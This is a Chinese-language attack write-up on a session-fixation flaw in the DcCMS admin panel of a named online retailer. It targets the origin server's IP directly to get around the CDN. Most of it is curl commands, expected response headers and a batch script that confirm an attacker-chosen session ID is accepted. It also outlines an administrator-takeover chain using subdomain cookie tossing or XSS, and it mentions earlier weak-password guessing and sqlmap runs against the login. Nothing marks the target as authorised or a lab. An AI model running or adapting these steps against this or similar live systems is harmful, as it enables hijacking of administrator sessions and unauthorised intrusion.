# shopto.net 源站 DcCMS /dc/ 与 /pp/：sidcms 会话固定（CWE-384）

## 目标与指纹
- 资产：shopto.net 源站 `3.8.196.174:443`（公网直达，非 CloudFront 边缘）
- 组件：Apache + DcCMS 2015（dcshop，dynamic commerce GmbH）
- vhost 路由：`Host: cp.shopto.net`（任一 `*.shopto.net` 子域均可；`localhost` 走默认 vhost）
- 生产面 `www.shopto.net` 经 CloudFront，同一操纵会被重新生成 sidcms → 已防护；缺陷仅在源站直连面
- 姊妹条目：DcCMS 后台口令面已判死（43 组默认/弱口令全 302、`/dc/?action=` 52 个值全回落登录页、sqlmap 判 input_login 非动态/无 SQLi、DcCMS 2015 无公开 CVE）——本条的会话固定是**另一条入口**，不是口令绕过

## Cookie 语义（实测结论）
| cookie | 作用 | 属性 |
|---|---|---|
| `sidcms` | 会话标识 | Set-Cookie 带 `path=/; SameSite=Strict; secure; HttpOnly`，host-only |
| `sidcms_last_action` | `/dc/` 的配套动作 cookie，**值任意**（`1000`、过期值都行） | — |
| `sidcms_last_action_pp` | `/pp/` 的配套动作 cookie，同上 | path=/pp |

服务端逻辑（黑盒推定）：
1. 同时收到 `sidcms` + 对应路径的 `last_action` → **原样沿用客户端给的 sidcms，不下发新值**（不签名、不与服务端状态绑定）
2. 只收到 `sidcms`、缺对应 `last_action` → 重新生成 28 位随机会话 ID
3. 路径隔离：`/pp/` 只认 `sidcms_last_action_pp`；拿 `/dc/` 的 `sidcms_last_action` 打 `/pp/` 会被换新
4. 字符白名单：`sidcms` 接受 1~100 位 `[A-Za-z0-9-]`（实测 `A`、`AA`、`100×A` 均被接受）；含单引号等非法字符 → 拒绝并换新
5. 登录失败（302 回登录页）后不 regenerate，固定值继续沿用

## 复现命令（逐条抓原始响应头）
所有请求：`curl -k --http1.0 --noproxy '*'`（本机挂代理时必须 `--noproxy '*'` 才打到源站；旧 vhost 用 HTTP/1.1 可能空回显）。

### ① 命中：固定 sidcms 被原样接受
```bash
curl -sk --noproxy '*' --http1.0 -D - -o /dev/null \
  -H 'Host: cp.shopto.net' \
  -H 'Cookie: sidcms=AB12CD34EF56AB12CD34EF56AB; sidcms_last_action=1000' \
  https://3.8.196.174/dc/
```
期望：
```
HTTP/1.0 200 OK
Set-Cookie: sidcms=AB12CD34EF56AB12CD34EF56AB; path=/; SameSite=Strict; secure; HttpOnly
```

### ② 阴性对照：缺 last_action → 换新（证明 ① 不是单纯反射）
```bash
curl -sk --noproxy '*' --http1.0 -D - -o /dev/null \
  -H 'Host: cp.shopto.net' \
  -H 'Cookie: sidcms=AB12CD34EF56AB12CD34EF56AB' \
  https://3.8.196.174/dc/
```
期望：`Set-Cookie: sidcms=<新的 28 位随机值>`

### ③ 白名单边界
```bash
# 短值 / 长值均被接受
for v in A AA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA; do
  curl -sk --noproxy '*' --http1.0 -D - -o /dev/null -H 'Host: cp.shopto.net' \
    -H "Cookie: sidcms=$v; sidcms_last_action=1000" https://3.8.196.174/dc/ | grep -i '^Set-Cookie: sidcms'
done
# 含单引号 → 拒绝并换新
curl -sk --noproxy '*' --http1.0 -D - -o /dev/null -H 'Host: cp.shopto.net' \
  -H "Cookie: sidcms=AB'12; sidcms_last_action=1000" https://3.8.196.174/dc/ | grep -i '^Set-Cookie: sidcms'
```

### ④ 登录失败路径不 regenerate
```bash
curl -sk --noproxy '*' --http1.0 -D - -o /dev/null -X POST \
  -H 'Host: cp.shopto.net' \
  -H 'Cookie: sidcms=AB12CD34EF56AB12CD34EF56AB; sidcms_last_action=1000' \
  --data 'input_login=admin&input_password=wrongpass123' \
  'https://3.8.196.174/dc/?action=admin_login'
```
期望：`HTTP/1.0 302 Found` + `Set-Cookie: sidcms=AB12CD34EF56AB12CD34EF56AB`

### ⑤ /pp/ 同型 + 路径隔离
```bash
# 命中
curl -sk --noproxy '*' --http1.0 -D - -o /dev/null -H 'Host: cp.shopto.net' \
  -H 'Cookie: sidcms=AB12CD34EF56AB12CD34EF56AB; sidcms_last_action_pp=1000' \
  https://3.8.196.174/pp/
# 拿 /dc/ 的 last_action 打 /pp/ → 换新（隔离）
curl -sk --noproxy '*' --http1.0 -D - -o /dev/null -H 'Host: cp.shopto.net' \
  -H 'Cookie: sidcms=AB12CD34EF56AB12CD34EF56AB; sidcms_last_action=1000' \
  https://3.8.196.174/pp/
```

### ⑥ 生产对照（应换新）
```bash
curl -sk --http1.0 -D - -o /dev/null \
  -H 'Cookie: sidcms=AB12CD34EF56AB12CD34EF56AB; sidcms_last_action=1000' \
  https://www.shopto.net/dc/
```
期望：`Set-Cookie: sidcms=<新随机值>` → 生产已防护，只打源站 IP。

## 判据
- **成立**：Set-Cookie 里的 `sidcms` 与请求提交值**逐字相同**，且同一时刻去掉 `last_action` 就换新（二态对照缺一不可）
- **不成立**：任何一组返回新随机值 —— 先检查是否打到了 CloudFront、是否漏了 `--noproxy '*'`、Host 是否用了 `*.shopto.net`
- 只反射不回显 ≠ 成立：必须确认后续请求（带同一 cookie 打 `/dc/` 功能页）仍认这个会话，故要做 ④ 与登录后回读

## 利用链与真实边界（重要）
服务端前提已证实，完整接管**尚未证实**：
1. 需要把两个 cookie 写进受害者（管理员）浏览器：`sidcms` 是 host-only + HttpOnly（JS 不可读），可行面是同父域子域 cookie tossing（任一 `*.shopto.net` 子域 `Set-Cookie: sidcms=...; Domain=.shopto.net`），或响应头注入/XSS 写 cookie
2. 受害者在该固定会话上访问 `/dc/` 并**登录成功**
3. 若登录成功路径执行了 `session_regenerate_id`（无凭据未能验证），本条立即判死，不能升级为后台接管
4. 受害者通常不会主动访问 `3.8.196.174` 裸 IP，cookie 必须是域 cookie 才会随 `cp.shopto.net`/`www` 请求发出——这是实际可达性的主要门槛

## 失败/常见原因
- 打到生产/CDN → 永远换新；确认响应 `Server: Apache` 且直连 IP
- 只带 `sidcms` 不带对应 last_action → 换新（这是设计行为，不是防护）
- `/pp/` 带成 `sidcms_last_action` → 换新（路径隔离）
- `sidcms` 含 `[A-Za-z0-9-]` 以外字符（如 `'`）→ 换新
- HTTP/1.1 打源站部分 vhost 空回显 → 加 `--http1.0`
- 本机代理做了 MITM，部分路径返回空 → 加 `--noproxy '*'`

## 参考实现（批量判定）
```bash
T=https://3.8.196.174
H='Host: cp.shopto.net'
SID=AB12CD34EF56AB12CD34EF56AB
for path in dc pp; do
  la=$([ "$path" = pp ] && echo sidcms_last_action_pp || echo sidcms_last_action)
  got=$(curl -sk --noproxy '*' --http1.0 -D - -o /dev/null -H "$H" \
        -H "Cookie: sidcms=$SID; $la=1000" "$T/$path/" | grep -i '^Set-Cookie: sidcms' | tr -d '\r')
  echo "$path -> $got"
done
# 期望两行都含 $SID
```